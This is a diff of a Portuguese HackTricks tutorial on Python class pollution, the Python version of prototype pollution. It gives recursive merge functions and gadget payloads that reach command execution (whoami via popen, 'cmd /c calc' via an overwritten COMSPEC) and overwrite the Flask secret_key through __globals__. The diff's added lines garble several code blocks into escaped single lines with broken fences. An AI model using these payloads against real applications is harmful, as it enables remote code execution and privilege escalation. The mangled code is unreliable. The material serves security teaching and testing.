@@ -1,4 +1,4 @@
-# Poluição de Classes (Prototype Pollution do Python)
+# Class Pollution (Python's Prototype Pollution)
 
 <details>
 
@@ -9,7 +9,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
@@ -17,6 +17,7 @@ Outras maneiras de apoiar o HackTricks:
 ## Exemplo Básico
 
 Verifique como é possível poluir classes de objetos com strings:
+
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -40,7 +41,9 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
+
 ## Exemplo Básico de Vulnerabilidade
+
 ```python
 # Initial state
 class Employee: pass
@@ -73,57 +76,36 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
+
 ## Exemplos de Gadget
 
 <details>
 
 <summary>Criando valor padrão de propriedade de classe para RCE (subprocesso)</summary>
-```python
-from os import popen
-class Employee: pass # Creating an empty class
-class HR(Employee): pass # Class inherits from Employee class
-class Recruiter(HR): pass # Class inherits from HR class
 
-class SystemAdmin(Employee): # Class inherits from Employee class
-def execute_command(self):
-command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class
+
+class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
-# Recursive merge function
-for k, v in src.items():
-if hasattr(dst, '__getitem__'):
-if dst.get(k) and type(v) == dict:
-merge(v, dst.get(k))
-else:
-dst[k] = v
-elif hasattr(dst, k) and type(v) == dict:
-merge(v, getattr(dst, k))
-else:
-setattr(dst, k, v)
 
-USER_INPUT = {
-"__class__":{
-"__base__":{
-"__base__":{
-"custom_command": "whoami"
-}
-}
-}
-}
+## Recursive merge function
 
-recruiter_emp = Recruiter()
-system_admin_emp = SystemAdmin()
+for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "echo Hello there", output: "Hello there"
+USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }
 
-# Create default value for Employee.custom_command
-merge(USER_INPUT, recruiter_emp)
+recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "whoami", output: "abdulrah33m"
-```
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"
+
+## Create default value for Employee.custom\_command
+
+merge(USER\_INPUT, recruiter\_emp)
+
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"
+
+````
 </details>
 
 <details>
@@ -155,39 +137,33 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
-```
+````
+
 </details>
 
 <details>
 
 <summary>Execução arbitrária de subprocessos</summary>
-```python
-import subprocess, json
 
-class Employee:
-def __init__(self):
-pass
+\`\`\`python import subprocess, json
+
+class Employee: def **init**(self): pass
 
 def merge(src, dst):
-# Recursive merge function
-for k, v in src.items():
-if hasattr(dst, '__getitem__'):
-if dst.get(k) and type(v) == dict:
-merge(v, dst.get(k))
-else:
-dst[k] = v
-elif hasattr(dst, k) and type(v) == dict:
-merge(v, getattr(dst, k))
-else:
-setattr(dst, k, v)
 
-# Overwrite env var "COMSPEC" to execute a calc
-USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
+## Recursive merge function
 
-merge(USER_INPUT, Employee())
+for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
+
+## Overwrite env var "COMSPEC" to execute a calc
+
+USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value
+
+merge(USER\_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
-```
+
+````
 </details>
 
 <details>
@@ -230,19 +206,22 @@ merge(emp_info, Employee())
 print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
-```
+````
+
 </details>
 
 <details>
 
 <summary>Sobrescrevendo o segredo do Flask em diferentes arquivos</summary>
 
-Portanto, se você puder fazer uma poluição de classe sobre um objeto definido no arquivo Python principal da web, mas **cuja classe é definida em um arquivo diferente** do principal. Porque para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você será capaz de **acessar os globais nesse arquivo, mas não no principal**. \
+Portanto, se você puder fazer uma poluição de classe sobre um objeto definido no arquivo Python principal da web, mas **cuja classe é definida em um arquivo diferente** do principal. Porque para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você será capaz de **acessar os globais nesse arquivo, mas não no principal**.\
 Portanto, você **não poderá acessar o objeto global do aplicativo Flask** que definiu a **chave secreta** na página principal:
+
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+
 Neste cenário, você precisa de um dispositivo para percorrer arquivos até chegar ao principal para **acessar o objeto global `app.secret_key`** para alterar a chave secreta do Flask e ser capaz de [**escalar privilégios** conhecendo essa chave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
 Um payload como este [deste artigo](https://ctftime.org/writeup/36082):
@@ -276,7 +255,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
